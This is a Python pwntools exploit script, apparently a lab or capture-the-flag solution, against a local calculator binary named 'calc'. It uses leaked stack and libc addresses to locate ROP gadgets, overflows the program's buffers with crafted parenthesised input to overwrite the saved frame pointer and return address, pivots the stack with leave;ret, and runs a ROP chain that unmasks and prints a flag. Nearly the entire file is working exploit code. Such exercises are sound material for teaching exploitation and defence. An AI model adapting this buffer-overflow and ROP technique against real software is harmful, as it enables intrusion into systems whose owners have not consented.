#!/usr/bin/python3

from pwn import *
import os

def create_payload(addr1, addr2):
    # Stack content after main is called
    #   0 return address                                        (8 bytes)
    #       MAIN CALLED
    #   1 previous frame pointer                                (8 bytes)
    #   2 rop_chain                 (rbp - 0x220 + len(payload))
    #   3 buffer_in                 (rbp - 0x220)               (200 bytes)  <- we have this address (addr1)
    #   ...
    #      CALCULATE CALLED 
    
    # Stack content after calculate is called
    #   0 return address                            (8 bytes)                <- we can overwrite this value (in push function)
    #       CALCULATE CALLED
    #   1 previous frame pointer                    (8 bytes)                <- we can overwrite this value (in push funciton)
    #   2 buffer_1                  (rbp - 0x200)   (64*8 bytes)
    #   3 buffer_2                  (rbp - 0x400)   (64*8 bytes)
    #   4 buffer_1_top              (rbp - 0x408)   (8 bytes)
    #   5 buffer_2_top              (rbp - 0x410)   (8 bytes)
    #   6 ?                         (rbp - 0x418)   (8 bytes)
    #   7 ?                         (rbp - 0x420)   (8 bytes)
    #   8 input_buffer_address      (rbp - 0x428)   (8 bytes)
    #      NEXT_TOKEN CALLED 

    # import ELF files into pwntools
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')
    e = ELF('./calc')
    
    buff_addr = addr1
    libc_base_addr = addr2 - libc.symbols['printf']     # adress returned is the value of printf in lib c, so minus the offset of printf to find the base
    
    #GADGETS
    print("Finding gadgets")
    leave_ret       = libc_base_addr + next(libc.search(asm('leave ;        ret'), executable=True))
    sys_call_ret    = libc_base_addr + next(libc.search(asm('syscall ;      ret'), executable=True))
    pop_rax_ret     = libc_base_addr + next(libc.search(asm('pop rax ;      ret'), executable=True))
    pop_rdi_ret     = libc_base_addr + next(libc.search(asm('pop rdi ;      ret'), executable=True))
    pop_rsi_ret     = libc_base_addr + next(libc.search(asm('pop rsi ;      ret'), executable=True))
    pop_rdx_ret     = libc_base_addr + next(libc.search(asm('pop rdx ;      ret'), executable=True))
    print("Gadgets found")
    
    
    # calculate values to write to where rbp and return address is stored on the stack for calculates stack frame
        # address_to_write_rbp is (almost) the start of the rop chain in buffer_1 + offset of the overflow
        # + 1 byte for every character in the payload before the rop chain
        # except we set address_to_return to a leave_ret (Stack pivot) so - 8 bytes from the offset as it moves the rsp 8 bytes
        #   this is to do a stack pivot to point to the actual exploit rop chain in the input_buffer
    address_to_write_rbp = buff_addr + 128 + 1 + 65 + 1 - 8
    
    # return to a leave_ret to do a stack pivot, so that the next instruction executed afterwards is at the return address of our rop chain
    address_to_return = leave_ret

    # add the length of the integers in the input to take account of their length in respect to the start of the rop chain
    address_to_write_rbp += len(str(address_to_write_rbp).encode('utf-8'))
    address_to_write_rbp += len(str(address_to_return).encode('utf-8'))
    
    # input to fill buffer_1 in calculate
    content = b'1(' * 64
    
    # overwrite the saved rbp and return address of calculate to point to the rop chain stored in buffer_in mains stack frame
        # converts an address to a byte string - the program will convert this back to hex and then into little endian
        # e.g. 0x10 -> 16 -> b'16'
    content += str(address_to_write_rbp).encode('utf-8')
    content += b'(' # to ensure input is valid so code does not prematurely exit from invalid input
    content += str(address_to_return).encode('utf-8')
    
    content += b')' * 65 # to ensure input is valid so code does not prematurely exit from invalid input
    
    # write a null byte, fgets reads passed this and stores the following rop chain into buffer_in in mains stack frame
    # however, nothing after the null byte gets copied into the buffer that gets passed to calculate - ensuring non invalid input
    content += b'\x00' 

    # Now that we've overflown the buffer, create code to print the flag
   
    # find functions relating to the flag
    flag_address = e.symbols['flag']
    key_address = e.symbols['key']
    unmask_flag_address = e.symbols['unmask_flag']
    
    # unmask the flag - call unmask_flag with the argument key_address in rdi
    # stores the flag at flag_address
    content += p64(pop_rdi_ret)
    content += p64(key_address)
    
    content += p64(unmask_flag_address)
    
    # invoke a print syscall to print the value of flag_address
    # we can simply pass the memory address to the rop chain as the binary was not compiled as a PIE binary
    # load values 1, 1, flag_addr, 0x17 into registers rax, rdi, rsi, rdx respectivley
    # to print 0x17 characters after the flag_address
    
    content += p64(pop_rax_ret)
    content += p64(1)
    
    content += p64(pop_rdi_ret)
    content += p64(1)
    
    content += p64(pop_rsi_ret)
    content += p64(flag_address)
    
    content += p64(pop_rdx_ret)
    content += p64(0x17)
    
    content += p64(sys_call_ret)
    
    # invoke a graceful syscall exit with error code 0
    content += p64(pop_rax_ret)
    content += p64(60)
    
    content += p64(pop_rdi_ret)
    content += p64(0) 
    
    content += p64(sys_call_ret)
    
    return content


# DO NOT MODIFY THE CODE BELOW
# 
def main():
    context.arch = 'amd64'

    # launch program
    p=process('./calc')
    
    # Get the first two lines of output, containing info leak 
    s1 = p.recvline()
    print(s1.decode('utf-8'))
    addr1 = int(s1,16)   
    s2 = p.recvline()
    print(s2.decode('utf-8'))
    addr2 = int(s2,16)

    # create a payload, with the help of the info leak
    payload = create_payload(addr1, addr2)
    # send payload 
    print(p.recvuntil(b': ').decode('utf-8'))
    p.sendline(payload)
    # retrieve the final result
    print(p.recvall().decode('utf-8','ignore'))

if __name__ == '__main__':
    main()


